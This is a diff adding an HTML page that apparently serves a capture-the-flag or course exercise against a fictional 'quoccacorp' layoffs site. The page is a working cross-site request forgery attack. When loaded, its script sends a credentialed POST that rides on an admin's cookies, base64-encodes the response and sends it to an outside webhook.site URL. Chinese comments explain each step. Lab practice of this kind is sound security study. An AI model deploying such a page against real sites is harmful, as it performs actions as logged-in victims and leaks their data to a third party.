@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+  <h1>Initiating...</h1>
+  <script>
+    const targetUrl = "https://layoffs.quoccacorp.com/api/fire/melon";
+    const webhookUrl = "https://webhook.site/6d93283b-433c-45de-a47e-12509a086859";
+
+    // 第一步：尝试发起攻击请求
+    fetch(targetUrl, {
+      method: 'POST',
+      credentials: 'include' // 必须包含这个，尝试利用 Admin 的 Cookie
+    })
+      .then(async (response) => {
+        const status = response.status;
+        const text = await response.text();
+        // 第二步：将结果回传给你的 Webhook，方便你查看
+        fetch(`${webhookUrl}?status=${status}&data=${btoa(text)}`);
+      })
+      .catch((error) => {
+        // 如果被 CORS 拦截，也会在这里记录
+        fetch(`${webhookUrl}?error=CORS_or_Network_Error`);
+      });
+  </script>
+</body>
+
+</html>
